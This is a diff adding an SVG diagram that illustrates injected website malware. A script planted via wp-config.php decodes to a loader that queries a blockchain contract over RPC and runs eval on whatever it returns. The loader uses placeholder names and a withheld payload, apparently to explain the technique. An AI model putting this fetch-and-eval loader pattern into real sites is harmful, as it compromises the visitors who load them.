@@ -1,0 +1,74 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1600" height="900" viewBox="0 0 1600 900">
+<defs>
+<radialGradient id="b0" cx="8%" cy="8%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#f3c4aa" stop-opacity="1"/><stop offset="1" stop-color="#f3c4aa" stop-opacity="0"/></radialGradient>
+<radialGradient id="b1" cx="68%" cy="12%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#eab6c6" stop-opacity="1"/><stop offset="1" stop-color="#eab6c6" stop-opacity="0"/></radialGradient>
+<radialGradient id="b2" cx="88%" cy="62%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#d2c2e8" stop-opacity="1"/><stop offset="1" stop-color="#d2c2e8" stop-opacity="0"/></radialGradient>
+<radialGradient id="b3" cx="98%" cy="98%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#b6cae8" stop-opacity="1"/><stop offset="1" stop-color="#b6cae8" stop-opacity="0"/></radialGradient>
+<radialGradient id="b4" cx="6%" cy="92%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#f2cdb6" stop-opacity="1"/><stop offset="1" stop-color="#f2cdb6" stop-opacity="0"/></radialGradient>
+<radialGradient id="b5" cx="44%" cy="58%" r="62%" gradientUnits="objectBoundingBox"><stop offset="0" stop-color="#e6c0d8" stop-opacity="1"/><stop offset="1" stop-color="#e6c0d8" stop-opacity="0"/></radialGradient>
+<filter id="sh" x="-20%" y="-20%" width="140%" height="160%"><feDropShadow dx="0" dy="22" stdDeviation="28" flood-color="#3a2a3a" flood-opacity="0.20"/></filter>
+<style>.m{font-family:"IBM Plex Mono";}.s{font-family:"IBM Plex Sans";}</style></defs>
+<rect width="1600" height="900" fill="#e9cfd6"/>
+<rect width="1600" height="900" fill="url(#b0)"/>
+<rect width="1600" height="900" fill="url(#b1)"/>
+<rect width="1600" height="900" fill="url(#b2)"/>
+<rect width="1600" height="900" fill="url(#b3)"/>
+<rect width="1600" height="900" fill="url(#b4)"/>
+<rect width="1600" height="900" fill="url(#b5)"/>
+<g filter="url(#sh)"><rect x="200" y="118" width="800" height="452" rx="12" fill="#ffffff"/></g>
+<path d="M200 130 a12 12 0 0 1 12 -12 h776 a12 12 0 0 1 12 12 v34 h-800 z" fill="#f1f2f4"/>
+<circle cx="230" cy="141" r="7" fill="#ff5f57"/>
+<circle cx="254" cy="141" r="7" fill="#febc2e"/>
+<circle cx="278" cy="141" r="7" fill="#28c840"/>
+<rect x="320" y="128" width="560" height="26" rx="6" fill="#e3e5e9"/>
+<text class="s" x="600.0" y="146" font-size="15" fill="#6b717b" text-anchor="middle">view-source:https://client-site.example/</text>
+<rect x="201" y="291" width="798" height="114" fill="#fdecec"/>
+<rect x="260" y="291" width="3" height="114" fill="#d64545"/>
+<text class="m" x="244" y="204" font-size="17" fill="#a3a8b0" text-anchor="end">1</text>
+<text class="m" x="278" y="204" font-size="21" xml:space="preserve"><tspan fill="#6b717b">&lt;!DOCTYPE html&gt;</tspan></text>
+<text class="m" x="244" y="242" font-size="17" fill="#a3a8b0" text-anchor="end">2</text>
+<text class="m" x="278" y="242" font-size="21" xml:space="preserve"><tspan fill="#2451b8">&lt;html </tspan><tspan fill="#875f00">lang=</tspan><tspan fill="#b30000">"en"</tspan><tspan fill="#2451b8">&gt;</tspan></text>
+<text class="m" x="244" y="280" font-size="17" fill="#a3a8b0" text-anchor="end">3</text>
+<text class="m" x="278" y="280" font-size="21" xml:space="preserve"><tspan fill="#2451b8">&lt;head&gt;</tspan></text>
+<text class="m" x="244" y="318" font-size="17" fill="#a3a8b0" text-anchor="end">4</text>
+<text class="m" x="278" y="318" font-size="21" xml:space="preserve"><tspan fill="#2451b8">  &lt;script&gt;</tspan></text>
+<text class="m" x="244" y="356" font-size="17" fill="#a3a8b0" text-anchor="end">5</text>
+<text class="m" x="278" y="356" font-size="21" xml:space="preserve"><tspan fill="#b30000">    "cGxhY2Vob2xkZXI6IHRoZSByZWFsIG…"</tspan></text>
+<text class="m" x="244" y="394" font-size="17" fill="#a3a8b0" text-anchor="end">6</text>
+<text class="m" x="278" y="394" font-size="21" xml:space="preserve"><tspan fill="#2451b8">  &lt;/script&gt;</tspan></text>
+<text class="m" x="244" y="432" font-size="17" fill="#a3a8b0" text-anchor="end">7</text>
+<text class="m" x="278" y="432" font-size="21" xml:space="preserve"><tspan fill="#2451b8">  &lt;meta </tspan><tspan fill="#875f00">charset=</tspan><tspan fill="#b30000">"UTF-8"</tspan><tspan fill="#2451b8">&gt;</tspan></text>
+<text class="m" x="244" y="470" font-size="17" fill="#a3a8b0" text-anchor="end">8</text>
+<text class="m" x="278" y="470" font-size="21" xml:space="preserve"><tspan fill="#2451b8">  &lt;title&gt;</tspan><tspan fill="#15171a">Home</tspan><tspan fill="#2451b8">&lt;/title&gt;</tspan></text>
+<text class="m" x="244" y="508" font-size="17" fill="#a3a8b0" text-anchor="end">9</text>
+<text class="m" x="278" y="508" font-size="21" xml:space="preserve"><tspan fill="#6b717b">  …</tspan></text>
+<rect x="700" y="304" width="272" height="34" rx="6" fill="#d64545"/>
+<text class="s" x="836" y="327" font-size="16" font-weight="600" fill="#fff" text-anchor="middle" letter-spacing="0.5">added by wp-config.php</text>
+<path d="M836 338 L836 470" stroke="#d64545" stroke-width="2.5" stroke-dasharray="7 6" fill="none"/>
+<g filter="url(#sh)"><rect x="600" y="470" width="800" height="322" rx="12" fill="#22262e"/></g>
+<path d="M600 482 a12 12 0 0 1 12 -12 h776 a12 12 0 0 1 12 12 v32 h-800 z" fill="#1a1d23"/>
+<circle cx="630" cy="492" r="7" fill="#ff5f57"/>
+<circle cx="654" cy="492" r="7" fill="#febc2e"/>
+<circle cx="678" cy="492" r="7" fill="#28c840"/>
+<rect x="710" y="476" width="190" height="38" rx="5" fill="#22262e"/>
+<text class="s" x="805" y="500" font-size="15" fill="#d8dce3" text-anchor="middle">decoded-loader.js</text>
+<rect x="601" y="738" width="798" height="32" fill="#4a2a30"/>
+<text class="m" x="644" y="550" font-size="16" fill="#5d6675" text-anchor="end">1</text>
+<text class="m" x="670" y="550" font-size="19" xml:space="preserve"><tspan fill="#7f8ba0">// decoded from the base64 in &lt;head&gt;</tspan></text>
+<text class="m" x="644" y="580" font-size="16" fill="#5d6675" text-anchor="end">2</text>
+<text class="m" x="670" y="580" font-size="19" xml:space="preserve"><tspan fill="#c792ea">const </tspan><tspan fill="#e6e9ef">res</tspan><tspan fill="#e6e9ef"> = </tspan><tspan fill="#c792ea">await </tspan><tspan fill="#82aaff">fetch</tspan><tspan fill="#e6e9ef">(TESTNET_RPC, {</tspan></text>
+<text class="m" x="644" y="610" font-size="16" fill="#5d6675" text-anchor="end">3</text>
+<text class="m" x="670" y="610" font-size="19" xml:space="preserve"><tspan fill="#e6e9ef">  method: </tspan><tspan fill="#c3e88d">"POST"</tspan><tspan fill="#e6e9ef">,</tspan></text>
+<text class="m" x="644" y="640" font-size="16" fill="#5d6675" text-anchor="end">4</text>
+<text class="m" x="670" y="640" font-size="19" xml:space="preserve"><tspan fill="#e6e9ef">  body: </tspan><tspan fill="#e6e9ef">JSON</tspan><tspan fill="#e6e9ef">.</tspan><tspan fill="#82aaff">stringify</tspan><tspan fill="#e6e9ef">({ method: </tspan><tspan fill="#c3e88d">"eth_call"</tspan><tspan fill="#e6e9ef">,</tspan></text>
+<text class="m" x="644" y="670" font-size="16" fill="#5d6675" text-anchor="end">5</text>
+<text class="m" x="670" y="670" font-size="19" xml:space="preserve"><tspan fill="#e6e9ef">    params: [{ to: CONTRACT, data: GET }] })</tspan></text>
+<text class="m" x="644" y="700" font-size="16" fill="#5d6675" text-anchor="end">6</text>
+<text class="m" x="670" y="700" font-size="19" xml:space="preserve"><tspan fill="#e6e9ef">});</tspan></text>
+<text class="m" x="644" y="730" font-size="16" fill="#5d6675" text-anchor="end">7</text>
+<text class="m" x="670" y="730" font-size="19" xml:space="preserve"><tspan fill="#c792ea">const </tspan><tspan fill="#e6e9ef">{ result } = </tspan><tspan fill="#c792ea">await </tspan><tspan fill="#e6e9ef">res.</tspan><tspan fill="#82aaff">json</tspan><tspan fill="#e6e9ef">();</tspan></text>
+<text class="m" x="644" y="760" font-size="16" fill="#5d6675" text-anchor="end">8</text>
+<text class="m" x="670" y="760" font-size="19" xml:space="preserve"><tspan fill="#82aaff">eval</tspan><tspan fill="#e6e9ef">(decode(result));</tspan></text>
+<rect x="1070" y="739" width="304" height="30" rx="6" fill="#d64545"/>
+<text class="s" x="1222" y="760" font-size="15" font-weight="600" fill="#fff" text-anchor="middle">runs whatever the contract returns</text>
+</svg>
